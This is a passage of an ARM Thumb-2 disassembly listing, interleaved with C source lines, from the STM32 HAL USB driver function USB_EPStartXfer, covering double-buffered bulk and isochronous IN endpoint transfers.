 8006fb8:	781b      	ldrb	r3, [r3, #0]
 8006fba:	00da      	lsls	r2, r3, #3
 8006fbc:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006fbe:	4413      	add	r3, r2
 8006fc0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006fc4:	647b      	str	r3, [r7, #68]	; 0x44
 8006fc6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fc8:	881b      	ldrh	r3, [r3, #0]
 8006fca:	b29b      	uxth	r3, r3
 8006fcc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006fd0:	b29a      	uxth	r2, r3
 8006fd2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fd4:	801a      	strh	r2, [r3, #0]
 8006fd6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fda:	2b3e      	cmp	r3, #62	; 0x3e
 8006fdc:	d921      	bls.n	8007022 <USB_EPStartXfer+0x5f8>
 8006fde:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fe2:	095b      	lsrs	r3, r3, #5
 8006fe4:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fe8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fec:	f003 031f 	and.w	r3, r3, #31
 8006ff0:	2b00      	cmp	r3, #0
 8006ff2:	d104      	bne.n	8006ffe <USB_EPStartXfer+0x5d4>
 8006ff4:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006ff8:	3b01      	subs	r3, #1
 8006ffa:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006ffe:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007000:	881b      	ldrh	r3, [r3, #0]
 8007002:	b29a      	uxth	r2, r3
 8007004:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007008:	b29b      	uxth	r3, r3
 800700a:	029b      	lsls	r3, r3, #10
 800700c:	b29b      	uxth	r3, r3
 800700e:	4313      	orrs	r3, r2
 8007010:	b29b      	uxth	r3, r3
 8007012:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007016:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800701a:	b29a      	uxth	r2, r3
 800701c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800701e:	801a      	strh	r2, [r3, #0]
 8007020:	e056      	b.n	80070d0 <USB_EPStartXfer+0x6a6>
 8007022:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007026:	2b00      	cmp	r3, #0
 8007028:	d10a      	bne.n	8007040 <USB_EPStartXfer+0x616>
 800702a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800702c:	881b      	ldrh	r3, [r3, #0]
 800702e:	b29b      	uxth	r3, r3
 8007030:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007034:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007038:	b29a      	uxth	r2, r3
 800703a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800703c:	801a      	strh	r2, [r3, #0]
 800703e:	e047      	b.n	80070d0 <USB_EPStartXfer+0x6a6>
 8007040:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007044:	085b      	lsrs	r3, r3, #1
 8007046:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800704a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800704e:	f003 0301 	and.w	r3, r3, #1
 8007052:	2b00      	cmp	r3, #0
 8007054:	d004      	beq.n	8007060 <USB_EPStartXfer+0x636>
 8007056:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800705a:	3301      	adds	r3, #1
 800705c:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007060:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007062:	881b      	ldrh	r3, [r3, #0]
 8007064:	b29a      	uxth	r2, r3
 8007066:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800706a:	b29b      	uxth	r3, r3
 800706c:	029b      	lsls	r3, r3, #10
 800706e:	b29b      	uxth	r3, r3
 8007070:	4313      	orrs	r3, r2
 8007072:	b29a      	uxth	r2, r3
 8007074:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007076:	801a      	strh	r2, [r3, #0]
 8007078:	e02a      	b.n	80070d0 <USB_EPStartXfer+0x6a6>
 800707a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800707e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007082:	681b      	ldr	r3, [r3, #0]
 8007084:	785b      	ldrb	r3, [r3, #1]
 8007086:	2b01      	cmp	r3, #1
 8007088:	d122      	bne.n	80070d0 <USB_EPStartXfer+0x6a6>
 800708a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800708e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007092:	681b      	ldr	r3, [r3, #0]
 8007094:	653b      	str	r3, [r7, #80]	; 0x50
 8007096:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800709a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800709e:	681b      	ldr	r3, [r3, #0]
 80070a0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80070a4:	b29b      	uxth	r3, r3
 80070a6:	461a      	mov	r2, r3
 80070a8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80070aa:	4413      	add	r3, r2
 80070ac:	653b      	str	r3, [r7, #80]	; 0x50
 80070ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070b6:	681b      	ldr	r3, [r3, #0]
 80070b8:	781b      	ldrb	r3, [r3, #0]
 80070ba:	00da      	lsls	r2, r3, #3
 80070bc:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80070be:	4413      	add	r3, r2
 80070c0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80070c4:	64fb      	str	r3, [r7, #76]	; 0x4c
 80070c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070ca:	b29a      	uxth	r2, r3
 80070cc:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80070ce:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80070d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070d4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070d8:	681b      	ldr	r3, [r3, #0]
 80070da:	891b      	ldrh	r3, [r3, #8]
 80070dc:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80070e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070e4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070e8:	681b      	ldr	r3, [r3, #0]
 80070ea:	6959      	ldr	r1, [r3, #20]
 80070ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070f0:	b29b      	uxth	r3, r3
 80070f2:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80070f6:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80070fa:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80070fe:	6800      	ldr	r0, [r0, #0]
 8007100:	f001 f99f 	bl	8008442 <USB_WritePMA>
            ep->xfer_buff += len;
 8007104:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007108:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800710c:	681b      	ldr	r3, [r3, #0]
 800710e:	695a      	ldr	r2, [r3, #20]
 8007110:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007114:	441a      	add	r2, r3
 8007116:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800711a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800711e:	681b      	ldr	r3, [r3, #0]
 8007120:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8007122:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007126:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800712a:	681b      	ldr	r3, [r3, #0]
 800712c:	6a1a      	ldr	r2, [r3, #32]
 800712e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007132:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007136:	681b      	ldr	r3, [r3, #0]
 8007138:	691b      	ldr	r3, [r3, #16]
 800713a:	429a      	cmp	r2, r3
 800713c:	d90f      	bls.n	800715e <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800713e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007142:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007146:	681b      	ldr	r3, [r3, #0]
 8007148:	6a1a      	ldr	r2, [r3, #32]
 800714a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800714e:	1ad2      	subs	r2, r2, r3
 8007150:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007154:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007158:	681b      	ldr	r3, [r3, #0]
 800715a:	621a      	str	r2, [r3, #32]
 800715c:	e00e      	b.n	800717c <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 800715e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007162:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007166:	681b      	ldr	r3, [r3, #0]
 8007168:	6a1b      	ldr	r3, [r3, #32]
 800716a:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 800716e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007172:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007176:	681b      	ldr	r3, [r3, #0]
 8007178:	2200      	movs	r2, #0
 800717a:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800717c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007180:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007184:	681b      	ldr	r3, [r3, #0]
 8007186:	643b      	str	r3, [r7, #64]	; 0x40
 8007188:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800718c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007190:	681b      	ldr	r3, [r3, #0]
 8007192:	785b      	ldrb	r3, [r3, #1]
 8007194:	2b00      	cmp	r3, #0
 8007196:	d177      	bne.n	8007288 <USB_EPStartXfer+0x85e>
 8007198:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800719c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071a0:	681b      	ldr	r3, [r3, #0]
 80071a2:	63bb      	str	r3, [r7, #56]	; 0x38
 80071a4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071a8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071ac:	681b      	ldr	r3, [r3, #0]
 80071ae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80071b2:	b29b      	uxth	r3, r3
 80071b4:	461a      	mov	r2, r3
 80071b6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071b8:	4413      	add	r3, r2
 80071ba:	63bb      	str	r3, [r7, #56]	; 0x38
 80071bc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071c0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071c4:	681b      	ldr	r3, [r3, #0]
 80071c6:	781b      	ldrb	r3, [r3, #0]
 80071c8:	00da      	lsls	r2, r3, #3
 80071ca:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071cc:	4413      	add	r3, r2
 80071ce:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80071d2:	637b      	str	r3, [r7, #52]	; 0x34
 80071d4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071d6:	881b      	ldrh	r3, [r3, #0]
 80071d8:	b29b      	uxth	r3, r3
 80071da:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80071de:	b29a      	uxth	r2, r3
 80071e0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071e2:	801a      	strh	r2, [r3, #0]
 80071e4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071e8:	2b3e      	cmp	r3, #62	; 0x3e
 80071ea:	d921      	bls.n	8007230 <USB_EPStartXfer+0x806>
 80071ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071f0:	095b      	lsrs	r3, r3, #5
 80071f2:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071f6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071fa:	f003 031f 	and.w	r3, r3, #31
 80071fe:	2b00      	cmp	r3, #0
 8007200:	d104      	bne.n	800720c <USB_EPStartXfer+0x7e2>
 8007202:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007206:	3b01      	subs	r3, #1
 8007208:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800720c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800720e:	881b      	ldrh	r3, [r3, #0]
 8007210:	b29a      	uxth	r2, r3
 8007212:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007216:	b29b      	uxth	r3, r3
 8007218:	029b      	lsls	r3, r3, #10
 800721a:	b29b      	uxth	r3, r3
 800721c:	4313      	orrs	r3, r2
 800721e:	b29b      	uxth	r3, r3
 8007220:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007224:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007228:	b29a      	uxth	r2, r3
 800722a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800722c:	801a      	strh	r2, [r3, #0]
 800722e:	e050      	b.n	80072d2 <USB_EPStartXfer+0x8a8>
 8007230:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007234:	2b00      	cmp	r3, #0
 8007236:	d10a      	bne.n	800724e <USB_EPStartXfer+0x824>
 8007238:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800723a:	881b      	ldrh	r3, [r3, #0]
 800723c:	b29b      	uxth	r3, r3
 800723e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007242:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007246:	b29a      	uxth	r2, r3
 8007248:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800724a:	801a      	strh	r2, [r3, #0]
 800724c:	e041      	b.n	80072d2 <USB_EPStartXfer+0x8a8>
 800724e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007252:	085b      	lsrs	r3, r3, #1
 8007254:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007258:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800725c:	f003 0301 	and.w	r3, r3, #1
 8007260:	2b00      	cmp	r3, #0
 8007262:	d004      	beq.n	800726e <USB_EPStartXfer+0x844>
 8007264:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007268:	3301      	adds	r3, #1
 800726a:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800726e:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007270:	881b      	ldrh	r3, [r3, #0]
 8007272:	b29a      	uxth	r2, r3
 8007274:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007278:	b29b      	uxth	r3, r3
 800727a:	029b      	lsls	r3, r3, #10
 800727c:	b29b      	uxth	r3, r3
 800727e:	4313      	orrs	r3, r2
 8007280:	b29a      	uxth	r2, r3
 8007282:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007284:	801a      	strh	r2, [r3, #0]
 8007286:	e024      	b.n	80072d2 <USB_EPStartXfer+0x8a8>
 8007288:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800728c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007290:	681b      	ldr	r3, [r3, #0]
 8007292:	785b      	ldrb	r3, [r3, #1]
 8007294:	2b01      	cmp	r3, #1
 8007296:	d11c      	bne.n	80072d2 <USB_EPStartXfer+0x8a8>
 8007298:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800729c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072a0:	681b      	ldr	r3, [r3, #0]
 80072a2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80072a6:	b29b      	uxth	r3, r3
 80072a8:	461a      	mov	r2, r3
 80072aa:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80072ac:	4413      	add	r3, r2
 80072ae:	643b      	str	r3, [r7, #64]	; 0x40
 80072b0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072b4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072b8:	681b      	ldr	r3, [r3, #0]
 80072ba:	781b      	ldrb	r3, [r3, #0]
 80072bc:	00da      	lsls	r2, r3, #3
 80072be:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80072c0:	4413      	add	r3, r2
 80072c2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80072c6:	63fb      	str	r3, [r7, #60]	; 0x3c
 80072c8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072cc:	b29a      	uxth	r2, r3
 80072ce:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80072d0:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 80072d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072da:	681b      	ldr	r3, [r3, #0]
 80072dc:	895b      	ldrh	r3, [r3, #10]
 80072de:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ea:	681b      	ldr	r3, [r3, #0]
 80072ec:	6959      	ldr	r1, [r3, #20]
 80072ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072f2:	b29b      	uxth	r3, r3
 80072f4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072f8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072fc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007300:	6800      	ldr	r0, [r0, #0]
 8007302:	f001 f89e 	bl	8008442 <USB_WritePMA>
 8007306:	e227      	b.n	8007758 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007308:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800730c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007310:	681b      	ldr	r3, [r3, #0]
 8007312:	6a1b      	ldr	r3, [r3, #32]
 8007314:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007318:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007320:	681a      	ldr	r2, [r3, #0]
 8007322:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007326:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800732a:	681b      	ldr	r3, [r3, #0]
 800732c:	781b      	ldrb	r3, [r3, #0]
 800732e:	009b      	lsls	r3, r3, #2
 8007330:	4413      	add	r3, r2
 8007332:	881b      	ldrh	r3, [r3, #0]
 8007334:	b29b      	uxth	r3, r3
 8007336:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800733a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800733e:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8007342:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007346:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800734a:	681a      	ldr	r2, [r3, #0]
 800734c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007350:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007354:	681b      	ldr	r3, [r3, #0]
 8007356:	781b      	ldrb	r3, [r3, #0]
 8007358:	009b      	lsls	r3, r3, #2
 800735a:	441a      	add	r2, r3
 800735c:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8007360:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007364:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007368:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800736c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007370:	b29b      	uxth	r3, r3
 8007372:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007374:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007378:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800737c:	681b      	ldr	r3, [r3, #0]
 800737e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007380:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007384:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007388:	681b      	ldr	r3, [r3, #0]
 800738a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800738e:	b29b      	uxth	r3, r3
 8007390:	461a      	mov	r2, r3
 8007392:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007394:	4413      	add	r3, r2
 8007396:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007398:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800739c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073a0:	681b      	ldr	r3, [r3, #0]
 80073a2:	781b      	ldrb	r3, [r3, #0]
 80073a4:	00da      	lsls	r2, r3, #3
 80073a6:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80073a8:	4413      	add	r3, r2
 80073aa:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80073ae:	65bb      	str	r3, [r7, #88]	; 0x58
 80073b0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073b4:	b29a      	uxth	r2, r3
 80073b6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80073b8:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80073ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073c2:	681b      	ldr	r3, [r3, #0]
 80073c4:	891b      	ldrh	r3, [r3, #8]
 80073c6:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80073ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073d2:	681b      	ldr	r3, [r3, #0]
 80073d4:	6959      	ldr	r1, [r3, #20]
 80073d6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073da:	b29b      	uxth	r3, r3
 80073dc:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80073e0:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80073e4:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80073e8:	6800      	ldr	r0, [r0, #0]
 80073ea:	f001 f82a 	bl	8008442 <USB_WritePMA>
 80073ee:	e1b3      	b.n	8007758 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80073f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073f8:	681b      	ldr	r3, [r3, #0]
 80073fa:	6a1a      	ldr	r2, [r3, #32]
 80073fc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007400:	1ad2      	subs	r2, r2, r3
 8007402:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007406:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800740a:	681b      	ldr	r3, [r3, #0]
 800740c:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800740e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007412:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007416:	681a      	ldr	r2, [r3, #0]
 8007418:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007420:	681b      	ldr	r3, [r3, #0]
 8007422:	781b      	ldrb	r3, [r3, #0]
 8007424:	009b      	lsls	r3, r3, #2
 8007426:	4413      	add	r3, r2
 8007428:	881b      	ldrh	r3, [r3, #0]
 800742a:	b29b      	uxth	r3, r3
 800742c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007430:	2b00      	cmp	r3, #0
 8007432:	f000 80c6 	beq.w	80075c2 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007436:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800743a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800743e:	681b      	ldr	r3, [r3, #0]
 8007440:	673b      	str	r3, [r7, #112]	; 0x70
 8007442:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007446:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800744a:	681b      	ldr	r3, [r3, #0]
 800744c:	785b      	ldrb	r3, [r3, #1]
 800744e:	2b00      	cmp	r3, #0
 8007450:	d177      	bne.n	8007542 <USB_EPStartXfer+0xb18>
 8007452:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007456:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800745a:	681b      	ldr	r3, [r3, #0]
 800745c:	66bb      	str	r3, [r7, #104]	; 0x68
 800745e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007462:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007466:	681b      	ldr	r3, [r3, #0]
 8007468:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800746c:	b29b      	uxth	r3, r3
 800746e:	461a      	mov	r2, r3
 8007470:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007472:	4413      	add	r3, r2
 8007474:	66bb      	str	r3, [r7, #104]	; 0x68
 8007476:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800747a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800747e:	681b      	ldr	r3, [r3, #0]
 8007480:	781b      	ldrb	r3, [r3, #0]
 8007482:	00da      	lsls	r2, r3, #3
 8007484:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007486:	4413      	add	r3, r2
 8007488:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800748c:	667b      	str	r3, [r7, #100]	; 0x64
 800748e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007490:	881b      	ldrh	r3, [r3, #0]
 8007492:	b29b      	uxth	r3, r3
 8007494:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007498:	b29a      	uxth	r2, r3
 800749a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800749c:	801a      	strh	r2, [r3, #0]
 800749e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074a2:	2b3e      	cmp	r3, #62	; 0x3e
 80074a4:	d921      	bls.n	80074ea <USB_EPStartXfer+0xac0>
 80074a6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074aa:	095b      	lsrs	r3, r3, #5
 80074ac:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074b0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074b4:	f003 031f 	and.w	r3, r3, #31
 80074b8:	2b00      	cmp	r3, #0
 80074ba:	d104      	bne.n	80074c6 <USB_EPStartXfer+0xa9c>
 80074bc:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074c0:	3b01      	subs	r3, #1
 80074c2:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074c6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074c8:	881b      	ldrh	r3, [r3, #0]
 80074ca:	b29a      	uxth	r2, r3
 80074cc:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074d0:	b29b      	uxth	r3, r3
 80074d2:	029b      	lsls	r3, r3, #10
 80074d4:	b29b      	uxth	r3, r3
 80074d6:	4313      	orrs	r3, r2
 80074d8:	b29b      	uxth	r3, r3
 80074da:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074de:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074e2:	b29a      	uxth	r2, r3
 80074e4:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074e6:	801a      	strh	r2, [r3, #0]
 80074e8:	e050      	b.n	800758c <USB_EPStartXfer+0xb62>
